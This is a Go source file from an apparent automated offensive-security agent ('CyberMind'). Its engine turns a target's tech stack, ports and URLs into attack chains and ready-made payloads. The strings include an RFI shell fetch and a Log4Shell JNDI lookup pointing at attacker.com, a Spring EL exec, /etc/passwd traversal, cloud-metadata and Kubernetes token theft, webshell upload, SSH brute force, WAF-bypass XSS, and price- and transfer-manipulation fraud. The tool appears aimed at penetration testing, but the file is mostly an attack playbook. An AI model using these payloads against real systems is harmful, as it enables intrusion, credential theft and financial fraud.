// self_think.go — CyberMind Self-Thinking Engine
// Gives the agent its own "brain" — independent reasoning without relying on backend.
// Implements: chain-of-thought reasoning, hypothesis generation, attack intuition,
// business logic analysis, novel attack chain discovery, adaptive decision making,
// and self-observation via the self-model (observe.go).
package brain

import (
	"fmt"
	"strings"
)

// ThinkResult holds the output of the self-thinking engine.
type ThinkResult struct {
	Hypothesis    string
	AttackChain   []string
	Priority      string
	Confidence    float64
	Reasoning     string
	NovelAngles   []string
	BusinessLogic []string
	OAuthAngles   []string
	ToolPriority  []string
}

// TargetProfile holds everything known about a target for reasoning.
type TargetProfile struct {
	Target      string
	TechStack   []string
	OpenPorts   []int
	WAFDetected bool
	WAFVendor   string
	LiveURLs    []string
	Subdomains  []string
	BugsFound   []Bug
	Patterns    []Pattern
	ShodanData  map[string]string
	HTTPHeaders map[string]string
	JSFindings  []JSFinding
	OAuthURLs   []string
	RunCount    int
}

// SelfThink performs independent reasoning about a target without AI backend.
// Now enhanced with self-model integration — learns from past scans.
func SelfThink(profile TargetProfile) ThinkResult {
	result := ThinkResult{Confidence: 0.5}

	techStr := strings.ToLower(strings.Join(profile.TechStack, " "))
	urlStr := strings.ToLower(strings.Join(profile.LiveURLs, " "))
	headerStr := strings.ToLower(fmt.Sprintf("%v", profile.HTTPHeaders))

	var reasoning []string
	var attackChain []string
	var novelAngles []string
	var bizLogic []string
	var oauthAngles []string
	var toolPriority []string

	// ── Self-model integration — use learned knowledge ────────────────────
	// The agent knows what it's good at from past scans
	selfCtx := GetSelfModelContext()
	if selfCtx != "" {
		lines := strings.Split(selfCtx, "\n")
		if len(lines) > 1 {
			reasoning = append(reasoning, "Self-model: "+lines[1])
		}
		// Boost confidence based on past performance with this tech stack
		boost := GetConfidenceBoost(profile.TechStack, "xss")
		result.Confidence += boost
		if result.Confidence > 0.95 {
			result.Confidence = 0.95
		}
	}

	// ── Technology-based hypothesis ───────────────────────────────────────

	if strings.Contains(techStr, "wordpress") || strings.Contains(urlStr, "wp-") {
		result.Hypothesis = "WordPress installation — high probability of plugin/theme vulnerabilities"
		attackChain = append(attackChain,
			"wpscan --enumerate ap,at,u,m (aggressive plugin/theme/user enum)",
			"nuclei -t wordpress/ (WordPress-specific templates)",
			"Check wp-login.php for brute force protection",
			"Test xmlrpc.php for brute force amplification",
			"Check wp-json/wp/v2/users for user enumeration",
		)
		toolPriority = append(toolPriority, "wpscan", "nuclei")
		result.Confidence = 0.85
		reasoning = append(reasoning, "WordPress detected — plugin vulnerabilities are extremely common (CVE database has 10k+ WP vulns)")
	}

	if strings.Contains(techStr, "php") {
		attackChain = append(attackChain,
			"Test for LFI: ?file=../../../etc/passwd",
			"Test for RFI: ?page=http://attacker.com/shell.txt",
			"Test for PHP object injection in serialized cookies",
			"Check for phpinfo() exposure",
			"Test for SQL injection in all GET/POST parameters",
		)
		novelAngles = append(novelAngles,
			"PHP type juggling: '0e123' == '0e456' in loose comparison",
			"PHP deserialization via __wakeup() magic method",
			"PHP filter chain for LFI to RCE",
		)
		toolPriority = append(toolPriority, "sqlmap", "ffuf")
		reasoning = append(reasoning, "PHP backend — LFI, SQLi, and deserialization are primary attack vectors")
	}

	if strings.Contains(techStr, "node") || strings.Contains(techStr, "express") {
		attackChain = append(attackChain,
			"Test for prototype pollution: ?__proto__[admin]=true",
			"Test for SSRF in URL parameters",
			"Check for JWT secret weakness",
			"Test for NoSQL injection in MongoDB queries",
			"Check for path traversal in static file serving",
		)
		novelAngles = append(novelAngles,
			"Prototype pollution via JSON merge: {\"__proto__\":{\"isAdmin\":true}}",
			"Express.js path traversal: /static/../../../etc/passwd",
			"Node.js SSRF via URL parsing inconsistencies",
			"Next.js path traversal: /_next/static/../../../etc/passwd",
			"React server components: check for server-side data leakage",
			"Next.js API routes: test for missing auth on /api/* endpoints",
		)
		toolPriority = append(toolPriority, "nuclei", "dalfox")
		reasoning = append(reasoning, "Node.js/Express — prototype pollution and SSRF are high-value targets")
	}

	if strings.Contains(techStr, "django") || strings.Contains(techStr, "flask") ||
		strings.Contains(techStr, "python") {
		attackChain = append(attackChain,
			"Test for SSTI: {{7*7}} in all input fields",
			"Test for SSRF in URL parameters",
			"Check for Django debug mode (DEBUG=True)",
			"Test for mass assignment in REST API",
			"Check for insecure deserialization (pickle)",
		)
		novelAngles = append(novelAngles,
			"Django SSTI: {{settings.SECRET_KEY}} for key extraction",
			"Flask SSTI: {{config.items()}} for config dump",
			"Python pickle deserialization RCE",
		)
		toolPriority = append(toolPriority, "tplmap", "nuclei")
		reasoning = append(reasoning, "Python framework — SSTI is the primary RCE vector, SSRF is secondary")
	}

	if strings.Contains(techStr, "java") || strings.Contains(techStr, "spring") ||
		strings.Contains(techStr, "tomcat") || strings.Contains(techStr, "struts") {
		attackChain = append(attackChain,
			"Check for Spring4Shell (CVE-2022-22965)",
			"Test for Log4Shell (CVE-2021-44228): ${jndi:ldap://attacker.com/a}",
			"Test for Java deserialization (ysoserial payloads)",
			"Check for Spring Boot Actuator exposure (/actuator/env)",
			"Test for SSRF via Spring WebClient",
		)
		novelAngles = append(novelAngles,
			"Spring Boot Actuator /actuator/heapdump — memory dump with credentials",
			"Spring EL injection: #{T(java.lang.Runtime).getRuntime().exec('id')}",
			"Java deserialization via Commons Collections gadget chain",
		)
		toolPriority = append(toolPriority, "nuclei", "commix")
		result.Confidence = 0.9
		reasoning = append(reasoning, "Java/Spring — Log4Shell and deserialization are critical vectors; Actuator exposure is common")
	}

	if strings.Contains(techStr, "graphql") || strings.Contains(urlStr, "graphql") ||
		strings.Contains(urlStr, "/api/graphql") {
		attackChain = append(attackChain,
			"Run graphw00f for engine fingerprinting",
			"Test introspection: {__schema{types{name}}}",
			"Test for IDOR via direct object access",
			"Test for batching attacks (DoS + rate limit bypass)",
			"Test for field suggestion attacks",
			"Check for nested query DoS",
		)
		novelAngles = append(novelAngles,
			"GraphQL IDOR: query{user(id:2){email,password}}",
			"GraphQL batching: [{query:...},{query:...}] x1000 for rate limit bypass",
			"GraphQL introspection → full schema dump → find admin mutations",
			"GraphQL alias attack: {a:user(id:1) b:user(id:2) c:user(id:3)}",
		)
		toolPriority = append(toolPriority, "graphw00f", "nuclei")
		result.Confidence = 0.88
		reasoning = append(reasoning, "GraphQL detected — IDOR and introspection are primary vectors; batching attacks often bypass rate limits")
	}

	// ── Port-based reasoning ──────────────────────────────────────────────

	for _, port := range profile.OpenPorts {
		switch port {
		case 22:
			attackChain = append(attackChain, "SSH brute force with hydra (rockyou.txt)")
			toolPriority = append(toolPriority, "hydra")
		case 3306:
			attackChain = append(attackChain, "MySQL direct access attempt (default creds)")
			novelAngles = append(novelAngles, "MySQL UDF injection for RCE if write access")
		case 6379:
			attackChain = append(attackChain, "Redis unauthenticated access → RCE via cron/SSH key write")
			novelAngles = append(novelAngles, "Redis SSRF: RESP protocol via Gopher URL scheme")
			result.Confidence = 0.95
			reasoning = append(reasoning, "Redis on port 6379 — unauthenticated Redis is critical RCE")
		case 27017:
			attackChain = append(attackChain, "MongoDB unauthenticated access → full database dump")
			result.Confidence = 0.95
			reasoning = append(reasoning, "MongoDB on 27017 — unauthenticated MongoDB is critical data exposure")
		case 9200:
			attackChain = append(attackChain, "Elasticsearch unauthenticated access → full index dump")
			result.Confidence = 0.95
		case 5432:
			attackChain = append(attackChain, "PostgreSQL brute force + pg_read_file for LFI")
		case 8080, 8443, 8888:
			attackChain = append(attackChain, "Admin panel on alternate port — test default credentials")
			bizLogic = append(bizLogic, "Admin panel on non-standard port — often less secured")
		}
	}

	// ── WAF-aware reasoning ───────────────────────────────────────────────

	if profile.WAFDetected {
		novelAngles = append(novelAngles,
			fmt.Sprintf("WAF bypass for %s: use chunked encoding + Unicode normalization", profile.WAFVendor),
			"HTTP request smuggling to bypass WAF inspection",
			"Case variation: <ScRiPt>alert(1)</sCrIpT>",
			"Double URL encoding: %253Cscript%253E",
			"Null byte injection: payload%00<script>",
		)
		reasoning = append(reasoning, fmt.Sprintf("WAF (%s) detected — standard payloads will be blocked; use encoding + smuggling bypass", profile.WAFVendor))
	}

	// ── Business logic reasoning ──────────────────────────────────────────

	if strings.Contains(urlStr, "cart") || strings.Contains(urlStr, "checkout") ||
		strings.Contains(urlStr, "payment") || strings.Contains(urlStr, "order") {
		bizLogic = append(bizLogic,
			"Price manipulation: modify price parameter to negative/zero/0.001",
			"Quantity manipulation: set quantity to -1 for credit",
			"Coupon stacking: apply same coupon multiple times",
			"Race condition on checkout: concurrent requests to apply discount",
			"Currency manipulation: change currency code to lower-value currency",
			"Integer overflow: set quantity to MAX_INT for free items",
		)
		result.Confidence = 0.9
		reasoning = append(reasoning, "E-commerce flow detected — price/quantity manipulation is high-value target")
	}

	if strings.Contains(urlStr, "transfer") || strings.Contains(urlStr, "withdraw") ||
		strings.Contains(urlStr, "balance") || strings.Contains(urlStr, "account") {
		bizLogic = append(bizLogic,
			"Negative transfer: transfer -$100 to receive $100",
			"Race condition on transfer: concurrent transfers exceeding balance",
			"IDOR on account ID: access other users' account data",
			"Decimal precision attack: transfer $0.001 repeatedly",
		)
		result.Confidence = 0.95
		reasoning = append(reasoning, "Financial flow detected — race conditions and negative values are critical")
	}

	if strings.Contains(urlStr, "invite") || strings.Contains(urlStr, "referral") ||
		strings.Contains(urlStr, "promo") || strings.Contains(urlStr, "bonus") {
		bizLogic = append(bizLogic,
			"Self-referral: refer yourself for bonus",
			"Referral code reuse: use same code multiple times",
			"Promo code brute force: enumerate valid codes",
		)
	}

	// ── OAuth/SSO reasoning ───────────────────────────────────────────────

	if len(profile.OAuthURLs) > 0 || strings.Contains(urlStr, "oauth") ||
		strings.Contains(urlStr, "sso") || strings.Contains(urlStr, "saml") ||
		strings.Contains(headerStr, "authorization") {
		oauthAngles = append(oauthAngles,
			"Test missing state parameter (CSRF)",
			"Test redirect_uri manipulation (open redirect → token theft)",
			"Test PKCE downgrade attack",
			"Test implicit flow (deprecated, insecure)",
			"Test JWT algorithm confusion (RS256 → HS256)",
			"Test scope escalation (request admin scopes)",
			"Test SSO bypass via parameter pollution",
		)
		reasoning = append(reasoning, "OAuth/SSO detected — state parameter and redirect_uri are primary attack vectors")
	}

	// ── Memory-based reasoning ────────────────────────────────────────────

	if len(profile.BugsFound) > 0 {
		for _, bug := range profile.BugsFound {
			reasoning = append(reasoning,
				fmt.Sprintf("Previous bug found: %s [%s] at %s — look for similar patterns", bug.Title, bug.Severity, bug.URL))
		}
		result.Confidence = min64(result.Confidence+0.1, 1.0)
	}

	if len(profile.Patterns) > 0 {
		for _, p := range profile.Patterns {
			if p.SuccessRate > 0.5 {
				attackChain = append([]string{
					fmt.Sprintf("PROVEN PATTERN (%.0f%% success): %s — %s", p.SuccessRate*100, p.Type, p.Description),
				}, attackChain...)
			}
		}
	}

	// ── JS intelligence reasoning ─────────────────────────────────────────

	if len(profile.JSFindings) > 0 {
		for _, f := range profile.JSFindings {
			if f.Type == "secret" {
				reasoning = append(reasoning, fmt.Sprintf("SECRET found in JS: %s — use for authenticated testing", f.Value))
				result.Confidence = min64(result.Confidence+0.15, 1.0)
			}
			if f.Type == "endpoint" {
				attackChain = append(attackChain, fmt.Sprintf("Test discovered endpoint: %s", f.Value))
			}
		}
	}

	// ── Advanced tech-specific attack patterns ────────────────────────────

	// Kubernetes / Docker / Cloud
	if strings.Contains(techStr, "kubernetes") || strings.Contains(techStr, "k8s") ||
		strings.Contains(urlStr, "k8s") || strings.Contains(headerStr, "kubernetes") {
		novelAngles = append(novelAngles,
			"K8s SSRF: curl http://169.254.169.254/latest/meta-data/ for cloud metadata",
			"K8s API server: curl https://kubernetes.default.svc/api/v1/namespaces",
			"K8s service account token: /var/run/secrets/kubernetes.io/serviceaccount/token",
			"K8s etcd: curl http://etcd:2379/v2/keys/?recursive=true",
		)
		reasoning = append(reasoning, "Kubernetes detected — SSRF to metadata service and API server are critical")
		result.Confidence = min64(result.Confidence+0.1, 1.0)
	}

	if strings.Contains(techStr, "aws") || strings.Contains(techStr, "s3") ||
		strings.Contains(urlStr, "amazonaws") || strings.Contains(urlStr, "s3.") {
		novelAngles = append(novelAngles,
			"AWS SSRF: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			"S3 bucket enumeration: aws s3 ls s3://target-bucket --no-sign-request",
			"S3 ACL misconfiguration: public read/write on sensitive buckets",
			"AWS metadata v2 bypass: X-aws-ec2-metadata-token header required",
		)
		reasoning = append(reasoning, "AWS/S3 detected — SSRF to metadata service and S3 misconfiguration are high-value")
		result.Confidence = min64(result.Confidence+0.1, 1.0)
	}

	// API-specific attacks
	if strings.Contains(urlStr, "/api/") || strings.Contains(urlStr, "/v1/") ||
		strings.Contains(urlStr, "/v2/") || strings.Contains(urlStr, "/rest/") {
		attackChain = append(attackChain,
			"Test IDOR: change user_id/account_id in API requests",
			"Test mass assignment: add admin=true to JSON body",
			"Test HTTP method override: X-HTTP-Method-Override: DELETE",
			"Test API versioning: /api/v1/ vs /api/v2/ for different security",
			"Test JWT manipulation: decode, modify claims, re-sign with weak secret",
		)
		novelAngles = append(novelAngles,
			"API BOLA: GET /api/v1/users/1 → try /api/v1/users/2,3,4...",
			"API mass assignment: POST {\"role\":\"admin\",\"verified\":true}",
			"API rate limit bypass: X-Forwarded-For rotation",
		)
		reasoning = append(reasoning, "REST API detected — IDOR/BOLA and mass assignment are primary vectors")
	}

	// WebSocket attacks
	if strings.Contains(urlStr, "ws://") || strings.Contains(urlStr, "wss://") ||
		strings.Contains(headerStr, "upgrade: websocket") {
		novelAngles = append(novelAngles,
			"WebSocket CSRF: cross-origin WebSocket hijacking",
			"WebSocket injection: inject malicious frames",
			"WebSocket SSRF: use WebSocket to reach internal services",
		)
		reasoning = append(reasoning, "WebSocket detected — CSRF and injection are primary vectors")
	}

	// CORS misconfiguration
	if strings.Contains(headerStr, "access-control-allow-origin") {
		novelAngles = append(novelAngles,
			"CORS misconfiguration: Origin: https://evil.com → check if reflected",
			"CORS null origin: Origin: null → check if allowed",
			"CORS subdomain: Origin: https://evil.target.com → check if wildcard subdomain",
		)
		reasoning = append(reasoning, "CORS headers detected — test for misconfiguration with evil origin")
	}

	// File upload attacks
	if strings.Contains(urlStr, "upload") || strings.Contains(urlStr, "file") ||
		strings.Contains(urlStr, "import") || strings.Contains(urlStr, "attachment") {
		attackChain = append(attackChain,
			"File upload: upload PHP/JSP/ASPX webshell with double extension (shell.php.jpg)",
			"File upload: bypass MIME type check with Content-Type: image/jpeg",
			"File upload: SVG XSS: <svg onload=alert(1)>",
			"File upload: XXE via SVG/XML upload",
			"File upload: path traversal in filename: ../../etc/passwd",
		)
		result.Confidence = min64(result.Confidence+0.1, 1.0)
		reasoning = append(reasoning, "File upload detected — webshell upload and path traversal are critical vectors")
	}

	// Admin panel detection
	if strings.Contains(urlStr, "admin") || strings.Contains(urlStr, "dashboard") ||
		strings.Contains(urlStr, "manage") || strings.Contains(urlStr, "panel") {
		attackChain = append(attackChain,
			"Admin panel: test default credentials (admin:admin, admin:password, admin:123456)",
			"Admin panel: test for authentication bypass via SQL injection",
			"Admin panel: test for IDOR to access other admin accounts",
			"Admin panel: check for exposed debug endpoints",
		)
		bizLogic = append(bizLogic,
			"Admin panel access: privilege escalation via role parameter manipulation",
			"Admin panel: horizontal privilege escalation between admin accounts",
		)
		result.Confidence = min64(result.Confidence+0.05, 1.0)
		reasoning = append(reasoning, "Admin panel detected — default credentials and auth bypass are primary vectors")
	}

	// ── Novel attack chain generation ─────────────────────────────────────

	novelAngles = append(novelAngles,
		"HTTP Request Smuggling: CL.TE and TE.CL variants",
		"Web Cache Poisoning: unkeyed header injection (X-Forwarded-Host)",
		"Host Header Injection: password reset poisoning",
		"SSRF chain: internal metadata → cloud credentials → lateral movement",
		"2FA bypass: race condition on OTP validation window",
		"Account takeover via password reset token predictability",
		"JWT none algorithm: alg=none for signature bypass",
		"IDOR via UUID prediction: sequential/timestamp-based UUIDs",
		"Mass assignment via HTTP PATCH with undocumented fields",
		"Insecure Direct Object Reference via GraphQL ID parameter",
		"Server-Side Template Injection via error messages",
		"XXE via file upload (SVG, DOCX, XLSX, PDF)",
		"CRLF injection in HTTP headers for response splitting",
		"Open redirect chaining for OAuth token theft",
		"Subdomain takeover via expired cloud service CNAME",
	)

	if len(profile.Subdomains) > 5 {
		novelAngles = append(novelAngles,
			fmt.Sprintf("Subdomain takeover: check %d subdomains for dangling CNAME records", len(profile.Subdomains)),
			"S3 bucket takeover: check for unclaimed S3 buckets in subdomains",
		)
	}

	// ── Adaptive tool ordering from self-model ────────────────────────────
	if len(toolPriority) > 0 {
		toolPriority = GetAdaptiveToolOrder(profile.TechStack, toolPriority)
	}

	// ── Compile final result ──────────────────────────────────────────────

	if result.Hypothesis == "" {
		result.Hypothesis = fmt.Sprintf("Target %s — running comprehensive attack chain", profile.Target)
	}

	seen := make(map[string]bool)
	dedup := func(s []string) []string {
		var out []string
		for _, v := range s {
			if !seen[v] {
				seen[v] = true
				out = append(out, v)
			}
		}
		return out
	}

	result.AttackChain = dedup(attackChain)
	result.NovelAngles = dedup(novelAngles)
	result.BusinessLogic = dedup(bizLogic)
	result.OAuthAngles = dedup(oauthAngles)
	result.ToolPriority = dedup(toolPriority)
	result.Reasoning = strings.Join(reasoning, "\n  → ")
	result.Priority = confidenceToPriority(result.Confidence)

	return result
}

// FormatThinkResult returns a human-readable self-think output.
func FormatThinkResult(r ThinkResult) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("\n  🧠 SELF-THINK ENGINE — Confidence: %.0f%% [%s]\n", r.Confidence*100, strings.ToUpper(r.Priority)))
	sb.WriteString(fmt.Sprintf("  Hypothesis: %s\n\n", r.Hypothesis))

	if r.Reasoning != "" {
		sb.WriteString("  Reasoning:\n  → " + r.Reasoning + "\n\n")
	}

	if len(r.AttackChain) > 0 {
		sb.WriteString("  Attack Chain:\n")
		for i, step := range r.AttackChain {
			sb.WriteString(fmt.Sprintf("  %d. %s\n", i+1, step))
		}
		sb.WriteString("\n")
	}

	if len(r.NovelAngles) > 0 {
		sb.WriteString("  Novel Attack Angles:\n")
		for _, a := range r.NovelAngles {
			sb.WriteString("  • " + a + "\n")
		}
		sb.WriteString("\n")
	}

	if len(r.BusinessLogic) > 0 {
		sb.WriteString("  Business Logic Flaws:\n")
		for _, b := range r.BusinessLogic {
			sb.WriteString("  💰 " + b + "\n")
		}
		sb.WriteString("\n")
	}

	if len(r.OAuthAngles) > 0 {
		sb.WriteString("  OAuth/SSO Attack Vectors:\n")
		for _, o := range r.OAuthAngles {
			sb.WriteString("  🔑 " + o + "\n")
		}
		sb.WriteString("\n")
	}

	if len(r.ToolPriority) > 0 {
		sb.WriteString("  Priority Tools: " + strings.Join(r.ToolPriority, " → ") + "\n")
	}

	return sb.String()
}

// BuildTargetProfile builds a TargetProfile from memory + live data.
func BuildTargetProfile(target string, liveURLs []string, openPorts []int,
	wafDetected bool, wafVendor string, techStack []string,
	jsFindings []JSFinding, oauthURLs []string) TargetProfile {

	mem := LoadTarget(target)
	combined := append(techStack, mem.TechStack...)
	combinedPorts := append(openPorts, mem.OpenPorts...)
	combinedURLs := append(liveURLs, mem.LiveURLs...)

	wv := wafVendor
	if wv == "" {
		wv = mem.WAFVendor
	}

	return TargetProfile{
		Target:      target,
		TechStack:   combined,
		OpenPorts:   combinedPorts,
		WAFDetected: wafDetected || mem.WAFDetected,
		WAFVendor:   wv,
		LiveURLs:    combinedURLs,
		Subdomains:  mem.SubdomainsFound,
		BugsFound:   mem.BugsFound,
		Patterns:    mem.PatternsWorked,
		JSFindings:  jsFindings,
		OAuthURLs:   oauthURLs,
		RunCount:    mem.RunCount,
	}
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

func confidenceToPriority(c float64) string {
	switch {
	case c >= 0.9:
		return "critical"
	case c >= 0.75:
		return "high"
	case c >= 0.5:
		return "medium"
	default:
		return "low"
	}
}

func min64(a, b float64) float64 {
	if a < b {
		return a
	}
	return b
}
